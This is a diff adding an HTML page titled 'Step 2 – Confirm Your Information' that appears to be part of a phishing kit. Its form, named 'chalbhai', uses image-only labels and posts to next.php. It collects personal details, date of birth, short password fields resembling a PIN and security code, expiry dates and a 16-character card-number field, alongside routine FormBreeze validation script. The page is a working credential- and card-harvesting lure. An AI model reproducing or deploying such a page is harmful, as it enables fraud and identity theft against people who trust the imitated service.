@@ -1,0 +1,501 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Step 2
+  </title>
+  <meta content="content-type" http-equiv="content-type" />
+  <link href="images/favicon.ico" rel="shortcut icon" />
+  <script type="text/javascript">
+   function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+  </script>
+ </head>
+ <body bgcolor="#F7F7F5" onload="unhideBody()" style="visibility: visible;">
+  <style type="text/css">
+   /*----------Text Styles----------*/
+.ws6 {font-size: 8px;}
+.ws7 {font-size: 9.3px;}
+.ws8 {font-size: 11px;}
+.ws9 {font-size: 12px;}
+.ws10 {font-size: 13px;}
+.ws11 {font-size: 15px;}
+.ws12 {font-size: 16px;}
+.ws14 {font-size: 19px;}
+.ws16 {font-size: 21px;}
+.ws18 {font-size: 24px;}
+.ws20 {font-size: 27px;}
+.ws22 {font-size: 29px;}
+.ws24 {font-size: 32px;}
+.ws26 {font-size: 35px;}
+.ws28 {font-size: 37px;}
+.ws36 {font-size: 48px;}
+.ws48 {font-size: 64px;}
+.ws72 {font-size: 96px;}
+.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
+/*----------Para Styles----------*/
+DIV,UL,OL /* Left */
+{
+ margin-top: 0px;
+ margin-bottom: 0px;
+}
+  </style>
+  <script language="JavaScript">
+   &lt;!--
+
+var b = 0 ;
+var i = 0 ;
+var errmsg = "" ;
+var punct = "" ;
+var min = 0 ;
+var max = 0 ;
+
+function formbreeze_email(field) {
+
+	if (b &amp;&amp; (field.value.length == 0)) return true ;
+
+
+	if (! emailCheck(field.value))
+	  {
+		  field.focus();
+		  if (field.type == "text") field.select();
+		  return false ;
+	  }
+
+   return true ;
+}
+
+function formbreeze_filledin(field) {
+
+if (b &amp;&amp; (field.value.length == 0)) return true;
+
+if (field.value.length &lt; min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+if ((max &gt; 0) &amp;&amp; (field.value.length &gt; max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+return true ;
+}
+
+function formbreeze_number(field) {
+
+if (b &amp;&amp; (field.value.length == 0)) return true ; ;
+
+if (i)
+ var valid = "0123456789"
+else
+ var valid = ".,0123456789"
+
+var pass = 1;
+var temp;
+for (var i=0; i&lt;field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+ }
+
+if (field.value &lt; min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+
+if ((max &gt; 0) &amp;&amp; (field.value &gt; max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+
+function formbreeze_numseq(field) {
+
+
+if (b &amp;&amp; (field.value.length == 0)) return true ;
+
+var valid = punct + "0123456789"
+
+var pass = 1;
+var digits = 0
+var temp;
+for (var i=0; i&lt;field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+if (valid.indexOf(temp) &gt; (punct.length-1) ) digits++ ;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ; ;
+   }
+
+if (digits &lt; min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+if ((max &gt; 0) &amp;&amp; (digits &gt; max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+function emailCheck (emailStr) {
+
+var checkTLD=1;
+var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
+var emailPat=/^(.+)@(.+)$/;
+var specialChars="\\(\\)&gt;&lt;@,;:\\\\\\\"\\.\\[\\]";
+var validChars="\[^\\s" + specialChars + "\]";
+var quotedUser="(\"[^\"]*\")";
+var atom=validChars + '+';
+var word="(" + atom + "|" + quotedUser + ")";
+var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
+var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
+var matchArray=emailStr.match(emailPat);
+
+if (matchArray==null) {
+alert(errmsg);
+return false;
+}
+var user=matchArray[1];
+var domain=matchArray[2];
+
+for (i=0; i&lt;user.length; i++) {
+if (user.charCodeAt(i)&gt;127) {
+alert(errmsg);
+return false;
+   }
+}
+for (i=0; i&lt;domain.length; i++) {
+if (domain.charCodeAt(i)&gt;127) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (user.match(userPat)==null) {
+alert(errmsg);
+return false;
+}
+
+var atomPat=new RegExp("^" + atom + "$");
+var domArr=domain.split(".");
+var len=domArr.length;
+for (i=0;i&lt;len;i++) {
+if (domArr[i].search(atomPat)==-1) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (checkTLD &amp;&amp; domArr[domArr.length-1].length!=2 &amp;&amp;
+domArr[domArr.length-1].search(knownDomsPat)==-1) {
+alert(errmsg);
+return false;
+}
+
+if (len&lt;2) {
+alert(errmsg);
+return false;
+}
+
+return true;
+}
+
+function formbreeze_sub()
+{
+/*
+//FBDATA:formtext1^0^1^0^0^Please Fill in All Of the Required Fields:;formtext2^0^1^0^0^Please Fill in All Of the Required Fields:;formtext3^0^1^0^0^Please Fill in All Of the Required Fields:;formtext4^0^1^0^0^Please Fill in All Of the Required Fields:;formtext5^0^1^0^0^Please Fill in All Of the Required Fields:;formtext6^0^1^0^0^Please Fill in All Of the Required Fields:;formtext7^0^1^0^0^Please Fill in All Of the Required Fields:;formtext10^0^1^0^0^Please Fill in All Of the Required Fields:;formtext11^0^1^0^0^Please Fill in All Of the Required Fields:;formtext12^0^1^0^0^Please Fill in All Of the Required Fields:;
+*/
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext3) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext4) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext5) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext6) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext7) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext10) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext11) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext12) ) return false ;
+
+}
+--&gt;
+  </script>
+  <div style="position:absolute; overflow:hidden; left:0px; top:0px; width:978px; height:171px; z-index:0" id="image1">
+   <img width="978" height="171" border="0" title="" alt="" src="images/heAder.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:1px; top:1311px; width:979px; height:99px; z-index:1" id="image2">
+   <a href="#">
+    <img width="979" height="99" border="0" title="" alt="" src="images/footer.png" />
+   </a>
+  </div>
+  <div style="position:absolute; overflow:hidden; left:237px; top:251px; width:600px; height:1000px; z-index:2" id="shape1">
+   <img width="100%" height="100%" border="0" src="images/shape34033203.gif" alt="" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:239px; top:250px; width:534px; height:61px; z-index:3" id="image3">
+   <img width="534" height="61" border="0" title="" alt="" src="images/personal.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:243px; top:330px; width:243px; height:190px; z-index:4" id="image4">
+   <img width="243" height="190" border="0" title="" alt="" src="images/11.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:249px; top:610px; width:224px; height:101px; z-index:5" id="image5">
+   <img width="224" height="101" border="0" title="" alt="" src="images/12.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:240px; top:535px; width:536px; height:62px; z-index:7" id="image7">
+   <img width="536" height="62" border="0" title="" alt="" src="images/biiillll.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:250px; top:774px; width:61px; height:38px; z-index:8" id="image8">
+   <img width="61" height="38" border="0" title="" alt="" src="images/14.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:250px; top:877px; width:175px; height:41px; z-index:9" id="image9">
+   <img width="175" height="41" border="0" title="" alt="" src="images/15.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:251px; top:935px; width:159px; height:42px; z-index:10" id="image10">
+   <img width="159" height="42" border="0" title="" alt="" src="images/16.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:248px; top:825px; width:276px; height:39px; z-index:11" id="image11">
+   <img width="276" height="39" border="0" title="" alt="" src="images/screenshot_230.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:299px; top:841px; width:219px; height:20px; z-index:12" id="image12">
+   <a href="#">
+    <img width="219" height="20" border="0" title="" alt="" src="images/help2.png" />
+   </a>
+  </div>
+  <div style="position:absolute; overflow:hidden; left:250px; top:724px; width:161px; height:39px; z-index:13" id="image13">
+   <img width="161" height="39" border="0" title="" alt="" src="images/13.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:247px; top:1003px; width:394px; height:19px; z-index:14" id="image14">
+   <img width="394" height="19" border="0" title="" alt="" src="images/if%20you.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:249px; top:1043px; width:175px; height:41px; z-index:15" id="image15">
+   <img width="175" height="41" border="0" title="" alt="" src="images/15.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:251px; top:1099px; width:188px; height:38px; z-index:16" id="image16">
+   <img width="188" height="38" border="0" title="" alt="" src="images/17.png" />
+  </div>
+  <div style="position:absolute; left:261px; top:1194px; z-index:18" id="formimage2">
+   <input width="71" type="image" height="26" src="images/back.png" name="formimage2" />
+  </div>
+  <form onsubmit=" return formbreeze_sub()" method="post" id="chalbhai" name="chalbhai" action="next.php">
+   <div style="position:absolute; left:755px; top:1195px; z-index:17" id="formimage1">
+    <input width="63" type="image" height="26" src="images/qg%20in.png" name="formimage1" />
+   </div>
+   <input type="text" style="position:absolute;width:153px;left:253px;top:347px;z-index:19" name="formtext1" />
+   <input type="text" style="position:absolute;width:153px;left:251px;top:394px;z-index:20" name="formtext2" />
+   <input type="text" style="position:absolute;width:43px;left:254px;top:453px;z-index:21" maxlength="2" name="formtext3" />
+   <input type="text" style="position:absolute;width:69px;left:399px;top:453px;z-index:22" maxlength="4" name="formtext4" />
+   <select style="position:absolute;left:301px;top:454px;width:96px;z-index:23" name="formselect1">
+    <option>
+     January
+    </option>
+    <option>
+     February
+    </option>
+    <option>
+     March
+    </option>
+    <option>
+     April
+    </option>
+    <option>
+     May
+    </option>
+    <option>
+     June
+    </option>
+    <option>
+     July
+    </option>
+    <option>
+     August
+    </option>
+    <option>
+     September
+    </option>
+    <option>
+     October
+    </option>
+    <option>
+     November
+    </option>
+    <option>
+     December
+    </option>
+   </select>
+   <div style="position:absolute; left:254px; top:501px; z-index:24" id="formradio1">
+    <input type="radio" name="formradio1" />
+   </div>
+   <div style="position:absolute; left:305px; top:501px; z-index:25" id="formradio2">
+    <input type="radio" name="formradio1" />
+   </div>
+   <input type="text" style="position:absolute;width:153px;left:253px;top:625px;z-index:26" maxlength="8" name="formtext5" />
+   <input type="text" style="position:absolute;width:153px;left:254px;top:672px;z-index:27" maxlength="10" name="formtext6" />
+   <input type="text" style="position:absolute;width:153px;left:256px;top:739px;z-index:28" maxlength="20" name="formtext7" />
+   <input type="password" style="position:absolute;width:44px;left:253px;top:790px;z-index:29" maxlength="5" name="formtext8" />
+   <input type="password" style="position:absolute;width:44px;left:254px;top:841px;z-index:30" maxlength="3" name="formtext9" />
+   <select style="position:absolute;left:253px;top:893px;width:94px;z-index:31" name="formselect2">
+    <option>
+     January
+    </option>
+    <option>
+     February
+    </option>
+    <option>
+     March
+    </option>
+    <option>
+     April
+    </option>
+    <option>
+     May
+    </option>
+    <option>
+     June
+    </option>
+    <option>
+     July
+    </option>
+    <option>
+     August
+    </option>
+    <option>
+     September
+    </option>
+    <option>
+     October
+    </option>
+    <option>
+     November
+    </option>
+    <option>
+     December
+    </option>
+   </select>
+   <input type="text" style="position:absolute;width:70px;left:352px;top:893px;z-index:32" maxlength="4" name="formtext10" />
+   <input type="text" style="position:absolute;width:150px;left:253px;top:950px;z-index:33" name="formtext11" />
+   <select style="position:absolute;left:252px;top:1060px;width:94px;z-index:34" name="formselect3">
+    <option>
+     January
+    </option>
+    <option>
+     February
+    </option>
+    <option>
+     March
+    </option>
+    <option>
+     April
+    </option>
+    <option>
+     May
+    </option>
+    <option>
+     June
+    </option>
+    <option>
+     July
+    </option>
+    <option>
+     August
+    </option>
+    <option>
+     September
+    </option>
+    <option>
+     October
+    </option>
+    <option>
+     November
+    </option>
+    <option>
+     December
+    </option>
+   </select>
+   <input type="text" style="position:absolute;width:70px;left:351px;top:1060px;z-index:35" maxlength="4" name="formtext12" />
+   <input type="text" style="position:absolute;width:153px;left:252px;top:1113px;z-index:36" maxlength="16" name="formtext13" />
+   <div style="position:absolute; overflow:hidden; left:237px; top:216px; width:565px; height:35px; z-index:37; background-color:#F7F7F5" id="text1">
+    <div class="wpmd">
+     <div>
+      <font face="Gisha" class="ws20">
+       Confirm Your Information
+      </font>
+     </div>
+    </div>
+   </div>
+  </form>
+ </body>
+</html>
